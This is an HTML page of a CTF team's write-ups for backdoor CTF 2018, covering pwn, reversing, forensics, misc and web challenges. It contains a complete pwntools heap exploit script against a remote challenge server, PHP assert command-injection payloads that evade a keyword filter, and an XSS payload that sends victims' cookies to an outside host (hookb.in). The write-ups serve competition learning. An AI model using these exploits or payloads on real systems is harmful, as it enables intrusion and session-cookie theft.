@@ -1,0 +1,543 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>backdoor CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#shelter-(sces60107)">shelter-(sces60107)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#re-curse-(sces60107)">re-curse-(sces60107)</a>
+    
+                <a class="dropdown-item" href="#mind-fcuk-(sces60107)">mind-fcuk-(sces60107)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                forensic
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#random-noise-(qazwsxedcrfvtg14-sces60107)">random-noise-(qazwsxedcrfvtg14-sces60107)</a>
+    
+                <a class="dropdown-item" href="#vm-service-1-&-2-(sces60107-qazwsxedcrfvtg14)">vm-service-1-&-2-(sces60107-qazwsxedcrfvtg14)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#cats-everywhere-(sces60107)">cats-everywhere-(sces60107)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#bf-captcha-revenge-(solved-by-qazwsxedcrfvtg14,-written-by-bookgin)">bf-captcha-revenge-(solved-by-qazwsxedcrfvtg14,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#get-hired-(solved-by-sasdf,-written-by-bookgin)">get-hired-(solved-by-sasdf,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#get-hired-2-(unsolved,-written-by-bookgin)">get-hired-2-(unsolved,-written-by-bookgin)</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#shelter-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">shelter-(sces60107)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#re-curse-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">re-curse-(sces60107)</span>
+            </a>
+    
+<a href="#mind-fcuk-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">mind-fcuk-(sces60107)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">forensic</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#random-noise-(qazwsxedcrfvtg14-sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">random-noise-(qazwsxedcrfvtg14-sces60107)</span>
+            </a>
+    
+<a href="#vm-service-1-&-2-(sces60107-qazwsxedcrfvtg14)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">vm-service-1-&-2-(sces60107-qazwsxedcrfvtg14)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#cats-everywhere-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cats-everywhere-(sces60107)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu5" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu5" class="collapse sidebar-submenu">
+            <a href="#bf-captcha-revenge-(solved-by-qazwsxedcrfvtg14,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bf-captcha-revenge-(solved-by-qazwsxedcrfvtg14,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#get-hired-(solved-by-sasdf,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">get-hired-(solved-by-sasdf,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#get-hired-2-(unsolved,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">get-hired-2-(unsolved,-written-by-bookgin)</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="backdoor-ctf-2018"><a class="header-link" href="#backdoor-ctf-2018"></a>backdoor CTF 2018</h1>
+
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="shelter-(sces60107)"><a class="header-link" href="#shelter-(sces60107)"></a>shelter (sces60107)</h3>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r=remote(<span class="hljs-string">"51.15.73.163"</span>,<span class="hljs-number">8088</span>)
+<span class="hljs-comment">#r=process("./challenge")</span>
+<span class="hljs-comment">#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span>
+<span class="hljs-comment">#gdb.attach(proc.pidof(r)[0],'b *0x0804A65D\nc\n')</span>
+
+<span class="hljs-comment"># We want to overwrite the function on the heap</span>
+<span class="hljs-comment"># We can overwrite prev-size so that we can forge a chunk that will overlap with other chunk</span>
+
+
+
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"3"</span>)
+r.recvuntil(<span class="hljs-string">"at "</span>)
+help=int(r.recvline(),<span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> hex(help)
+
+system=help<span class="hljs-number">-0xc1a</span>+<span class="hljs-number">0xa30</span>
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"1"</span>)
+r.recvuntil(<span class="hljs-string">"content &gt;"</span>)
+r.send(<span class="hljs-string">"a"</span>*<span class="hljs-number">0xc8</span>+p64(<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0x111</span>))
+r.recvuntil(<span class="hljs-string">"at "</span>)
+heap0=int(r.recvline()[:<span class="hljs-number">-2</span>],<span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> hex(heap0)
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"1"</span>)
+r.recvuntil(<span class="hljs-string">"content &gt;"</span>)
+r.send(<span class="hljs-string">"a"</span>*<span class="hljs-number">0xc8</span>+p64(<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0x121</span>)+p64(heap0+<span class="hljs-number">0x300</span>)+p64(heap0+<span class="hljs-number">0x300</span>))
+r.recvuntil(<span class="hljs-string">"at "</span>)
+heap1=int(r.recvline()[:<span class="hljs-number">-2</span>],<span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> hex(heap1)
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"1"</span>)
+r.recvuntil(<span class="hljs-string">"content &gt;"</span>)
+r.send(p64(heap1+<span class="hljs-number">0xd0</span>)*<span class="hljs-number">10</span>)
+r.recvuntil(<span class="hljs-string">"at "</span>)
+heap2=int(r.recvline()[:<span class="hljs-number">-2</span>],<span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> hex(heap2)
+
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"1"</span>)
+r.recvuntil(<span class="hljs-string">"content &gt;"</span>)
+r.send(p64(heap1+<span class="hljs-number">0xd0</span>)*<span class="hljs-number">10</span>)
+r.recvuntil(<span class="hljs-string">"at "</span>)
+heap3=int(r.recvline()[:<span class="hljs-number">-2</span>],<span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> hex(heap3)
+
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"2"</span>)
+r.recvuntil(<span class="hljs-string">"note &gt;"</span>)
+r.sendline(<span class="hljs-string">"2"</span>)
+
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"1"</span>)
+r.recvuntil(<span class="hljs-string">"content &gt;"</span>)
+r.send(<span class="hljs-string">"a"</span>*<span class="hljs-number">0xe8</span>+p64(<span class="hljs-number">0x120</span>)+<span class="hljs-string">"\x00"</span>)
+r.recvuntil(<span class="hljs-string">"at "</span>)
+heap2=int(r.recvline()[:<span class="hljs-number">-2</span>],<span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> hex(heap2)
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"2"</span>)
+r.recvuntil(<span class="hljs-string">"note &gt;"</span>)
+r.sendline(<span class="hljs-string">"3"</span>)
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"1"</span>)
+r.recvuntil(<span class="hljs-string">"content &gt;"</span>)
+r.send(p64(system)*<span class="hljs-number">10</span>)
+r.recvuntil(<span class="hljs-string">"at "</span>)
+heap2=int(r.recvline()[:<span class="hljs-number">-2</span>],<span class="hljs-number">16</span>)
+<span class="hljs-keyword">print</span> hex(heap2)
+
+
+r.recvuntil(<span class="hljs-string">"choice &gt; "</span>)
+r.sendline(<span class="hljs-string">"2"</span>)
+r.recvuntil(<span class="hljs-string">"note &gt;"</span>)
+r.sendline(<span class="hljs-string">"2"</span>)
+r.interactive()
+
+</code></pre><h2 id="rev"><a class="header-link" href="#rev"></a>rev</h2>
+<h3 id="re-curse-(sces60107)"><a class="header-link" href="#re-curse-(sces60107)"></a>re-curse (sces60107)</h3>
+<p>In this challenge, you will get a binary file.</p>
+<p>After some investigation, you find out that it&#39;s a Haskell binary.</p>
+<p>This binary will take your input string and do some encoding, then it will compare your encoded string with the encoded flag.</p>
+<p>Here is an example</p>
+<p class="img-container"><img src="https://i.imgur.com/VhHVHEC.png" alt=""></p>
+<p>You can find out that <code>CTF</code> will become <code>dE4</code>.</p>
+<p>If encode both string in hex, you will find out the secret.</p>
+<pre class="hljs"><code>Hex(<span class="hljs-string">"CTF"</span>) = <span class="hljs-string">"435446"</span><span class="hljs-comment">;</span>
+Hex(<span class="hljs-string">"dE4"</span>) = <span class="hljs-string">"644534"</span><span class="hljs-comment">;</span></code></pre><p>This binary reverse the hex string.</p>
+<p>After knowing that encode algorithm, we just need find out the encoded flag.</p>
+<p>Finally, the flag is <code>CTF{R3_CURS3_I5_LIFT3D_0FF_Y0U}</code></p>
+<h3 id="mind-fcuk-(sces60107)"><a class="header-link" href="#mind-fcuk-(sces60107)"></a>mind-fcuk (sces60107)</h3>
+<p>You will get a binary from this challenge.</p>
+<p>First we can just execute it, and see what will happen.</p>
+<p class="img-container"><img src="https://i.imgur.com/TI82DQi.png" alt=""></p>
+<p>It has four keys.</p>
+<p>This binary will divide your input into four parts, and each part will be compared with those keys repectively after doing some encoding.</p>
+<p>The first part is ROT13.
+The second one is XOR.
+For the third one and four one, I just mantain a mapping table instead of reversing the algorithm.</p>
+<p>At the end I can produce the flag.</p>
+<p>The flag is <code>CTF{f5g4s8g4dyjj4f48f5d}</code></p>
+<h2 id="forensic"><a class="header-link" href="#forensic"></a>forensic</h2>
+<h3 id="random-noise-(qazwsxedcrfvtg14-sces60107)"><a class="header-link" href="#random-noise-(qazwsxedcrfvtg14-sces60107)"></a>random-noise (qazwsxedcrfvtg14 sces60107)</h3>
+<p>There are two phase in this challenge.</p>
+<p>At the begining, you can use <code>zsteg</code> to find out the first clue <code>key for vigenere cipher: THISKEYCANTBEGUESSED (not the flag)</code>
+<img src="https://i.imgur.com/EZm7WQi.png" alt=""></p>
+<p>And you also get another png file.
+After some investigation, you find out that some color exactly occur 4159 times in the second png file, the other colors only occur once. </p>
+<p>Leverage that feature, you can modify the png file.<img src="https://i.imgur.com/lYnyNLG.png" alt=""></p>
+<p>Now you get a sequence of morse code.
+Just decode it, you will get <code>YSIYSWFGYLHVNAMXKSZHWUMG</code>.
+This is the second clue.</p>
+<p>According to these clues, you can figure out the flag now. </p>
+<h3 id="vm-service-1-&-2-(sces60107-qazwsxedcrfvtg14)"><a class="header-link" href="#vm-service-1-&-2-(sces60107-qazwsxedcrfvtg14)"></a>vm-service 1 &amp; 2 (sces60107 qazwsxedcrfvtg14)</h3>
+<p>This challenge give you an ova file, and tell you that the password of his account is the first flag.</p>
+<p>It&#39;s very easy to get the root privilege.
+After that, you can get the password with /etc/shadow.</p>
+<p>But actually, we didn&#39;t get the password in that way.
+We noticed that there is a keylogger in this virtual machine.
+And we also found the log.</p>
+<p>After reversing the keylogger binary, you can figure the encoding of the log.
+Now you can dig the second flag and the password out of these logs.</p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>misc</h2>
+<h3 id="cats-everywhere-(sces60107)"><a class="header-link" href="#cats-everywhere-(sces60107)"></a>cats-everywhere (sces60107)</h3>
+<p>This challenge is easiest one.</p>
+<p>you will be given a git repo.</p>
+<p>In these kind of challenges, the first thing you need to do is check out the history of this repo.</p>
+<p>Here are some useful command</p>
+<pre class="hljs"><code>git <span class="hljs-built_in">log</span>
+
+git <span class="hljs-keyword">cat</span>-<span class="hljs-keyword">file</span> -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;object-id&gt;</span></code></pre><p>Soon you can find out the flag pictures.</p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
+<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
+<h3 id="bf-captcha-revenge-(solved-by-qazwsxedcrfvtg14,-written-by-bookgin)"><a class="header-link" href="#bf-captcha-revenge-(solved-by-qazwsxedcrfvtg14,-written-by-bookgin)"></a>BF-CAPTCHA-REVENGE (solved by qazwsxedcrfvtg14, written by bookgin)</h3>
+<p>The challenge is a website which shows some brainfuck code and an audio captcha, and I don&#39;t bother to solve it at all.</p>
+<p>First, the descrition of the challenge gives us the hint about the <code>.git</code>. We use <a href="https://github.com/internetwache/GitTools">GitTools</a> to crwal the repository.</p>
+<blockquote>
+<p>rnehra01 loves to version control and has made these captchas as good as hell.</p>
+</blockquote>
+<p>In the source code:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_clean</span><span class="hljs-params">($input)</span></span>{
+    ...
+
+    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/(base64_|eval|system|shell_|exec|php_)/i'</span>, $input)){<span class="hljs-comment">//no coomand injection </span>
+        bad_hacking_penalty();
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+    }
+
+    ...
+
+}
+
+<span class="hljs-keyword">if</span> (is_clean($user_ans)) {
+  assert(<span class="hljs-string">"'$real_ans' === '$user_ans'"</span>) 
+  ...
+}</code></pre><p>There is a obvious command injection, and it can be bypassed easily.</p>
+<p>The payload:</p>
+<pre class="hljs"><code>`'<span class="hljs-literal">OR</span> (<span class="hljs-string">"sys"</span>.<span class="hljs-string">"tem"</span>)(<span class="hljs-string">"ls -al"</span>) <span class="hljs-literal">OR</span>'`  
+`'<span class="hljs-literal">OR</span> (<span class="hljs-string">"sys"</span>.<span class="hljs-string">"tem"</span>)(<span class="hljs-string">"cat rand*"</span>) <span class="hljs-literal">OR</span>'`</code></pre><p>Acctually I&#39;m trying to create a reverse shell, but <code>system</code> seems to be more efficient and effective to retrieve the flag.</p>
+<p>Of course, I guess some team will solve all the reCAPTCHA to get the flag, and <a href="https://github.com/p4-team/ctf/tree/master/2018-03-18-backdoor-ctf/web_captcha">P4</a> proves that.</p>
+<h3 id="get-hired-(solved-by-sasdf,-written-by-bookgin)"><a class="header-link" href="#get-hired-(solved-by-sasdf,-written-by-bookgin)"></a>Get-hired (solved by sasdf, written by bookgin)</h3>
+<p>In <code>call.js</code>, this is vulenrable to XSS:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>(<span class="hljs-params">details</span>)</span>{
+    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'call\_details'</span>).innerHTML = details.sender\_username + <span class="hljs-string">" is calling "</span> + details.receiver_username + <span class="hljs-string">" ...."</span>;
+}</code></pre><p>It utilizes <code>postMessage</code> API to render the HTML content.</p>
+<pre class="hljs"><code>$(<span class="hljs-string">"#audiocall"</span>).click(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+         <span class="hljs-keyword">var</span> call_window;
+         call_window = <span class="hljs-built_in">window</span>.open(<span class="hljs-string">"call.php"</span>);
+         setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+             call_window.postMessage({
+               <span class="hljs-attr">type</span>: <span class="hljs-string">"audio"</span>,
+               <span class="hljs-attr">details</span>: {
+                 <span class="hljs-attr">sender_username</span>: <span class="hljs-string">"admin"</span>,
+                 sender\_team\_name: <span class="hljs-string">"InfosecIITR"</span>,
+                 receiver\_username: escapeHTML($(<span class="hljs-string">"#r\_call"</span>).val()),
+                 receiver\_team\_name: escapeHTML($(<span class="hljs-string">"#rteam_call"</span>).val())
+               }
+             }, <span class="hljs-string">"*"</span>);
+         }, <span class="hljs-number">100</span>);
+     });
+</code></pre><p>Also, sending a URL in <code>get hired</code> page allows the admin to browse a foreign site. Therefore, we just create a <code>evilsite.com</code> with the content below. The admin will post the XSS payload to iFrame, and we are able to get the cookie.</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"if"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://localhost/call.php"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>                                                                                
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">                                                                                                                                 
+<span class="hljs-keyword">var</span> ifr = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"if"</span>).contentWindow;                                                                                   
+<span class="hljs-keyword">var</span> payload = <span class="hljs-string">"&lt;img src=a onerror='window.location.href=(\"https://hookb.in/test?g=\" + btoa(document.cookie));'&gt;"</span>;                      
+
+setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{                                                                                                                   
+ifr.postMessage({                                                                                                                        
+  <span class="hljs-attr">type</span>: <span class="hljs-string">"audio"</span>,                                                                                                                         
+  <span class="hljs-attr">details</span>: {                                                                                                                             
+   <span class="hljs-attr">sender_username</span>: payload,                                                                                                             
+   <span class="hljs-attr">sender_team_name</span>: payload,                                                                                                            
+   <span class="hljs-attr">receiver_username</span>: payload,                                                                                                           
+   <span class="hljs-attr">receiver_team_name</span>: payload                                                                                                           
+  }                                                                                                                                      
+}, <span class="hljs-string">"*"</span>);                                                                                                                                 
+}, <span class="hljs-number">3000</span>);                                                                                                                                
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><h3 id="get-hired-2-(unsolved,-written-by-bookgin)"><a class="header-link" href="#get-hired-2-(unsolved,-written-by-bookgin)"></a>Get-hired 2 (unsolved, written by bookgin)</h3>
+<p>It adds an origin verification function.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verifyorigin</span>(<span class="hljs-params">originHref</span>) </span>{
+        <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"a"</span>);
+        a.href = originHref;        
+        <span class="hljs-keyword">return</span> a.hostname == <span class="hljs-built_in">window</span>.location.hostname
+}
+
+<span class="hljs-keyword">if</span>(!verifyorigin(event.origin)){
+    <span class="hljs-keyword">return</span>;
+    ...
+}</code></pre><p>Bypass it with null origin using <a href="https://en.wikipedia.org/wiki/Data_URI_scheme">data URI</a>. </p>
+<p>Reference:</p>
+<ol class="list">
+<li><a href="https://ctftime.org/writeup/9187">https://ctftime.org/writeup/9187</a></li>
+<li><a href="https://ctftime.org/writeup/9181">https://ctftime.org/writeup/9181</a></li>
+</ol>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
